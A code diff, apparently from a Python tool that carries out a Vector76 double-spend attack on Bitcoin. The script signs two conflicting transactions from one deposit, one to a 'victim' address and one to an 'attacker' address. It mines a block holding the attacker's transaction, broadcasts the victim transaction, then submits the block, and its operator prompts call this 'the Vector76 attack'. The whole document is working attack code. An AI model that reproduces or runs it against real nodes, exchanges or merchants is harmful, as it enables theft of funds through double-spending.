@@ -112,6 +112,8 @@ def get_block_header_by_txid(txid):
     print(f"Version: {block_data.get('ver')}")
     return block_header
 
+
+
 def mine_vector76_block(block_header_V, inject_tx):
     version_hex    = format(block_header_V["Version"], "08x")[::-1]
     #block_hex      = block_header_V["Block"][::-1]
@@ -138,7 +140,7 @@ password = args.password
 key      = args.attacker_signkey
 victim_address   = args.victim_address
 attacker_address = args.attacker_address
-amount_BTC = args.amount_of_coins#float(sys.argv[9])
+amount_BTC = args.amount_of_coins
 prev_txid  = args.prev_deposit_TXID
 #network = args.network
 
@@ -152,15 +154,7 @@ print("Connecting Node...")
 rpc_node = bitcoin.rpc.Proxy(service_url=f"http://{username}:{password}@{rpc_host}", service_port=rpc_port)#(rpcuser=username, rpcpasswd=password, rpchost=rpc_host, rpcport=rpc_port)
 
 print(rpc_node.getrawtransaction(prev_txid))
-print("--------------------")
-print(f"Send Amount (BTC)     : {amount_BTC}")
-print(f"Victim   Address      : {victim_address}")
-print(f"Attacker Address      : {attacker_address}")
-print("--------------------")
-
-print("[+] READY...")
-input(" --- Press the enter key to continue the Vector76 attack... --- ")
-#print(amount_satoshi)
+print()
 fee_satoshi = 1500
 print("sign T1")
 sk, pk = load_keys(attacker_address)
@@ -170,17 +164,37 @@ send_amount = amount_satoshi - fee_satoshi
 tx_victim = TX.build_from_io(prev_txid, 0, send_amount, victim_address)
 tx_victim = tx_victim.sign(sk, 0).serialize()
 print(tx_victim)
-
-print("sign T2")
-tx_attacker = TX.build_from_io(prev_txid, 0, send_amount, attacker_address)
-tx_attacker = tx_attacker.sign(sk, 0).serialize()
-print(key.send(tx_attacker))
-print()
-print("Request Blockheader...")
 block_header_V = get_block_header_by_txid(prev_txid)
 print("Mining Vector76 Block...")
-vector76_block = mine_vector76_block(block_header_V, tx_victim) # 一つ目のトランザクション = 被害者あてのトランザクション?
-print(vector76_block)
+tx_attacker = TX.build_from_io(prev_txid, 0, send_amount, attacker_address)
+tx_attacker = tx_attacker.sign(sk, 0).serialize()
+vector76_block = mine_vector76_block(block_header_V, tx_attacker) # 一つ目のトランザクション = 
+print("sign T2")
+print("--------------------")
+print(f"Send Amount (BTC)      : {amount_BTC}")
+print(f"Victim   Address       : {victim_address}")
+print(f"Attacker Address       : {attacker_address}")
+print(f"V1 RawTx               : {tx_victim}")
+print(f"V2 RawTx               : {tx_attacker}")
+print(f"Mined Vector76 Block Hash : {vector76_block}")
+print("--------------------")
+
+print("[+] READY...")
+input(" --- Press the enter key to continue the Vector76 attack... --- ")
+#print(amount_satoshi)
+print()
+print("push V1 TX...")
+broadcast_transaction(tx_victim)
+print()
+print("push V2 TX...")
+result = rpc_node.sendrawtransaction(tx_attacker) # 念の為V1とは別のやり方で
+print(f"[+] {result}")
+print()
+#print("Request Blockheader...")
+#block_header_V = get_block_header_by_txid(prev_txid)
+#print("Mining Vector76 Block...")
+#vector76_block = mine_vector76_block(block_header_V, tx_victim) # 一つ目のトランザクション = 被害者あてのトランザクション?
+#print(vector76_block)
 input("--- Send the block after pressing the enter key. --- ")
 print()
 print(f"Submitting Vector76 Block...   : {vector76_block}")
